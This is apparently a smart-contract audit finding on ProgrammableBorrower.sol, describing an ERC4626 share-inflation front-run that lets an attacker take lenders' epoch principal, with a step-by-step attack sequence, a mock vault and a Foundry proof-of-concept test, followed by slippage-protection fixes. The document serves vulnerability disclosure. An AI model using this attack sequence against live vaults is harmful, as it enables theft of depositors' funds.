### Title
Unbounded ERC4626 deposit slippage lets a vault user steal epoch principal - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary

`ProgrammableBorrower` accepts any ERC4626 vault whose asset matches the pool token, but does not validate that the vault has safe share pricing or existing liquidity during initialization. [1](#0-0) 

When an epoch starts, all idle underlying is deposited through `_depositToVault`, which calls `vault.deposit(_assetAmount, address(this))` without a minimum-share or minimum-asset-value check. [2](#0-1) [3](#0-2) 

An unprivileged user of an empty or nearly empty configured ERC4626 vault can front-run `startEpoch` with a first-deposit/donation share-inflation transaction, causing the programmable borrower to receive zero or economically worthless shares while the vault receives the entire facility balance. The attacker can then redeem their inflated share position and take the deposited principal.

### Finding Description

The vulnerable call is:

```solidity
// contracts/strategies/idle/ProgrammableBorrower.sol
uint256 shares = vault.deposit(_assetAmount, address(this));
```

The returned `shares` value is emitted but never checked against a minimum, a pre-inflation exchange rate, or its resulting `convertToAssets` value. [3](#0-2) 

ERC4626 explicitly treats an unfavorable difference between `previewDeposit` and the actual minted shares as deposit slippage, so the standard interface does not itself guarantee a fair share amount. [4](#0-3) 

For a vault calculating shares as `assets * totalSupply / totalAssets`, the sequence is:

1. The configured vault is empty, or has only dust liquidity.
2. The attacker deposits `1` unit and receives `1` share.
3. The attacker donates at least `D >= poolDeposit` underlying directly to the vault.
4. The pool starts an epoch and `ProgrammableBorrower` deposits `poolDeposit`.
5. The vault mints `poolDeposit / (1 + D) == 0` shares when `D >= poolDeposit`.
6. The attacker redeems their single share and receives `1 + D + poolDeposit`, for a profit of `poolDeposit`.

The same unchecked helper is also used for borrower repayments during active epochs, so subsequent deposits into an already manipulated vault can be captured as well. [5](#0-4) 

Accounting does not prevent the theft because `epochStartVaultAssets` snapshots the pre-deposit balance, while the contract’s actual recoverable ERC4626 position is separately calculated from `vault.balanceOf` and `convertToAssets`. [2](#0-1) [6](#0-5) 

### Impact Explanation

The attacker can steal the entire underlying balance deposited into the ERC4626 vault at epoch start.

Afterward, `epochStartVaultAssets` still reflects the original principal while `_currentVaultAssets()` is zero, so the sleeve records an equal vault loss rather than retaining a claim on the stolen funds. [7](#0-6) 

When lenders later request withdrawals, `onStopEpoch` has no economically meaningful vault assets to withdraw. [8](#0-7) 

The CDO’s subsequent borrower pull can therefore fail and enter the default path, leaving tranche holders and receipt holders to recover only through default finalization. [9](#0-8) 

### Likelihood Explanation

The attack is executable by any ERC4626 vault user and does not require a privileged role, borrower access, Keyring status, or a tranche balance.

It requires the configured vault to be empty, nearly empty, or otherwise vulnerable to share-price slippage. `ProgrammableBorrower.initialize` checks only that the vault asset matches the pool token and does not require existing liquidity, protected first-deposit semantics, a minimum share issuance, or a trusted exchange-rate source. [10](#0-9) 

Once that condition exists, the attack is a routine front-run around the honest owner or manager’s `startEpoch` transaction and is profitable by approximately the deposited facility balance minus transaction costs.

### Recommendation

Add explicit ERC4626 slippage protection to every `_depositToVault` call.

At minimum, `_depositToVault` should accept or derive a `minSharesOut`/`minAssetsOut` bound and revert when the returned shares or `vault.convertToAssets(shares)` falls below that bound. The bound should come from a manipulation-resistant reference rather than a same-transaction `previewDeposit` or spot `convertToShares` quote.

Prefer integrations that implement first-deposit protection or virtual shares, and consider requiring a nonzero minimum vault supply/assets during initialization. The same bound should cover deposits made from `onStartEpoch` and borrower repayments.

### Proof of Concept

A Foundry fork test can reproduce the flow against the production `IdleCDOEpochVariant` and `ProgrammableBorrower` wiring:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

contract InflationERC4626 is ERC20 {
    IERC20 public immutable asset;

    constructor(IERC20 _asset) ERC20("Vault Share", "vSHARE") {
        asset = _asset;
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 assetsBefore = totalAssets();
        uint256 supply = totalSupply();
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;

        asset.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        asset.transfer(receiver, assets);
    }

    // Remaining IERC4626 views/methods omitted for brevity.
}
```

```solidity
function testStartEpochDepositShareInflation() public {
    vm.createSelectFork(mainnetRpc, forkBlock);

    // Deploy and initialize production IdleCDOEpochVariant, IdleCreditVault,
    // and ProgrammableBorrower with InflationERC4626 as the configured vault.

    uint256 poolDeposit = 100_000e6;
    uint256 inflationDonation = poolDeposit;

    // 1. Attacker creates the first share before pool funds enter the vault.
    asset.mint(attacker, 1 + inflationDonation);
    vm.startPrank(attacker);
    asset.approve(address(vault), 1);
    vault.deposit(1, attacker);
    asset.transfer(address(vault), inflationDonation);
    vm.stopPrank();

    // 2. KYC-passed lender funds the credit vault.
    asset.mint(lender, poolDeposit);
    vm.startPrank(lender);
    asset.approve(address(cdo), poolDeposit);
    cdo.depositAA(poolDeposit);
    vm.stopPrank();

    // 3. Honest manager starts the epoch; ProgrammableBorrower deposits the
    // facility balance into the manipulated ERC4626 vault.
    vm.prank(manager);
    cdo.startEpoch();

    assertEq(vault.balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.vaultSharesBalance(), 0);
    assertEq(programmableBorrower.totalUnderlying(), 0);

    // 4. Attacker redeems the single inflated share for their donation plus
    // the pool deposit.
    uint256 attackerBefore = asset.balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    assertEq(asset.balanceOf(attacker) - attackerBefore, poolDeposit + inflationDonation + 1);

    // 5. A later withdrawal request cannot be covered and the epoch settles
    // through borrower default instead of recovering the stolen principal.
}
```

The important assertions are that the vault receives `poolDeposit`, the programmable borrower receives zero shares, and the attacker exits with approximately `poolDeposit` in profit.
